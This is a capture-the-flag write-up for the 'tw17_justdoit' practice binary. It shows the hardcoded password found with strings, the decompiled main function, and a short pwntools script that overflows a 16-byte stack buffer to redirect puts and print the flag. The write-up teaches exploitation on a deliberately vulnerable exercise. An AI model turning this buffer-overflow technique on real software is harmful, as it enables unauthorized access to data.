# tw17_justdoit

[Link to binary](https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tw17_justdoit/just_do_it)

---

```
~/Downloads > ./just_do_it 
Welcome my secret service. Do you know the password?
Input the password.
password123
Invalid Password, Try Again!
~/Downloads >
```

Fortunately enough, `strings` finds the password for us:

```
[...]
Correct Password, Welcome!
Invalid Password, Try Again!
P@SSW0RD
flag.txt
file open error.
[...]
```

```
~/Downloads > echo -n "P@SSW0RD" | ./just_do_it 
Welcome my secret service. Do you know the password?
Input the password.
Correct Password, Welcome!
```

The `-n` is to prevent `echo` from adding a newline to the end which is not considered part of the password by the executable.

But this isn't actually the flag, it's just a password. Let's fire Ghidra up.

```
undefined4 main(void)

{
  char *pcVar1;
  int iVar2;
  char local_28 [16];
  FILE *local_18;
  char *local_14;
  undefined *local_c;
  
  local_c = &stack0x00000004;
  setvbuf(stdin,(char *)0,2,0);
  setvbuf(stdout,(char *)0,2,0);
  setvbuf(stderr,(char *)0,2,0);
  local_14 = failed_message;
  local_18 = fopen("flag.txt","r");
  if (local_18 == (FILE *)0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  pcVar1 = fgets(flag,48,local_18);
  if (pcVar1 == (char *)0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  pcVar1 = fgets(local_28,32,stdin);
  if (pcVar1 == (char *)0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  iVar2 = strcmp(local_28,PASSWORD);
  if (iVar2 == 0) {
    local_14 = success_message;
  }
  puts(local_14);
  return 0;
}
```

The binary reads 48 bytes from `flag.txt` and put that in a global called `flag`. Can we divert a `puts` call to print it?

Well, do you see that call `puts(local_14)`? We can do a buffer overflow on `local_28` and write an arbitrary address into `local_14`. We just have to skip over a `FILE*` which, being a pointer and being this executable 32bits, it's 4 bytes long.

```python
from pwn import *

p = process("./just_do_it")
p.sendline((16+4) * b" " + p32(0x0804a080))
print(p.recvall(1).decode())
```

`0x0804a080` is the address of the `flag` global. I got that from Ghidra.

```
~/Downloads > python pwn_just_do_it.py 
[+] Starting local process './just_do_it': pid 24985
[+] Receiving all data: Done (91B)
[*] Process './just_do_it' stopped with exit code 0 (pid 24985)
Welcome my secret service. Do you know the password?
Input the password.
Dear{just_pwn_it}
```
